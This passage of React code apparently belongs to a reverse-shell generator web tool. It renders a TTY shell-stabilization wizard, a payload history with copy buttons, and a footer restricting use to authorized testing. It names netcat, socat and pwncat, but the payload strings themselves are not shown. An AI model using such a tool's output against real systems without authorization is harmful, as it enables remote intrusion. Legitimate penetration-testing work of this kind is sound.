                      TTY UPGRADE
                    </span>{" "}
                    tab after catching the shell.
                  </div>
                </div>
              </div>
            )}

            {/* TTY UPGRADE TAB */}
            {activeTab === "tty" && (
              <div className="output-card">
                <div className="card-header">
                  <span className="card-title">
                    TTY SHELL STABILIZATION WIZARD
                  </span>
                  <span className="length-badge">
                    step {ttyStep + 1} of {TTY_STEPS.length}
                  </span>
                </div>

                <div className="tty-intro">
                  <strong>Why you need this:</strong> Raw netcat shells lack job
                  control, tab completion, and proper TTY — Ctrl+C kills your
                  listener, editors won&apos;t work. This guide upgrades your
                  dumb shell to a fully interactive TTY. Use{" "}
                  <strong>socat PTY</strong> or <strong>pwncat</strong> to skip
                  this entirely.
                </div>

                <div className="tty-progress">
                  {TTY_STEPS.map((_, i) => (
                    <div
                      key={i}
                      className={`tty-progress-step ${i <= ttyStep ? "done" : ""}`}
                    />
                  ))}
                </div>

                <div className="tty-wizard">
                  {TTY_STEPS.map((step, stepIdx) => {
                    const isActive = stepIdx === ttyStep;
                    const isDone = stepIdx < ttyStep;
                    return (
                      <div key={step.id} className="tty-step">
                        <div
                          className="tty-step-header"
                          onClick={() => setTtyStep(stepIdx)}
                        >
                          <div
                            className={`tty-step-num ${isActive ? "active" : ""} ${isDone ? "done" : ""}`}
                          >
                            {isDone ? "✓" : stepIdx + 1}
                          </div>
                          <span
                            className="tty-step-title"
                            style={{
                              color: isActive
                                ? t.accent
                                : isDone
                                  ? "#00ff41"
                                  : t.muted,
                            }}
                          >
                            {step.title}
                          </span>
                        </div>
                        {isActive && (
                          <div className="tty-step-content">
                            <div className="tty-step-desc">
                              {step.description}
                            </div>
                            {step.commands.map((cmd, ci) => (
                              <div key={ci} className="tty-cmd-row">
                                <span
                                  className="tty-cmd-label"
                                  style={{
                                    color: cmd.preferred ? t.accent : t.muted,
                                  }}
                                >
                                  {cmd.label}
                                  {cmd.preferred && (
                                    <span className="tty-preferred-badge">
                                      preferred
                                    </span>
                                  )}
                                </span>
                                <div
                                  className={`tty-cmd ${cmd.preferred ? "preferred" : ""}`}
                                >
                                  {cmd.cmd}
                                </div>
                                <button
                                  className={`tty-copy-btn ${copiedCmd === `${stepIdx}-${ci}` ? "done" : ""}`}
                                  onClick={() =>
                                    copyCmd(cmd.cmd, `${stepIdx}-${ci}`)
                                  }
                                >
                                  {copiedCmd === `${stepIdx}-${ci}`
                                    ? "✓"
                                    : "copy"}
                                </button>
                              </div>
                            ))}
                            <div className="tty-nav">
                              {stepIdx > 0 && (
                                <button
                                  className="tty-nav-btn"
                                  onClick={() => setTtyStep((s) => s - 1)}
                                >
                                  ← back
                                </button>
                              )}
                              {stepIdx < TTY_STEPS.length - 1 && (
                                <button
                                  className="tty-nav-btn primary"
                                  onClick={() => setTtyStep((s) => s + 1)}
                                >
                                  next →
                                </button>
                              )}
                              {stepIdx === TTY_STEPS.length - 1 && (
                                <button
                                  className="tty-nav-btn primary"
                                  style={{
                                    color: "#00ff41",
                                    borderColor: "#00ff41",
                                  }}
                                  onClick={() => setTtyStep(0)}
                                >
                                  ✓ complete — restart
                                </button>
                              )}
                            </div>
                          </div>
                        )}
                      </div>
                    );
                  })}
                </div>
              </div>
            )}

            {/* HISTORY TAB */}
            {activeTab === "history" && showHistory && (
              <div className="output-card">
                <div className="card-header">
                  <span className="card-title">PAYLOAD HISTORY</span>
                  <button className="action-btn" onClick={() => setHistory([])}>
                    clear
                  </button>
                </div>
                <div className="history-list">
                  {history.length === 0 && (
                    <div className="empty-state">no history yet</div>
                  )}
                  {history.map((h, i) => (
                    <div
                      key={i}
                      className="history-item"
                      onClick={() => navigator.clipboard.writeText(h.payload)}
                    >
                      <div className="history-payload">{h.payload}</div>
                      <div className="history-meta">
                        <span>{h.shell}</span>
                        <span>{new Date(h.ts).toLocaleTimeString()}</span>
                        <span>{h.payload.length} chars</span>
                        <span style={{ color: t.accent }}>click to copy</span>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            )}
          </div>
        </div>
      </div>

      <footer className="footer">
        <div className="footer-text">
          <span className="status-dot" />
          {SHELLS.length} shells · MITRE ATT&CK tagged · for authorized
          engagements only
        </div>
        <div className="footer-text">
          DREW&apos;S REVSHELL v2.1 · educational &amp; authorized testing use
          only
        </div>
      </footer>
    </div>
  );
}
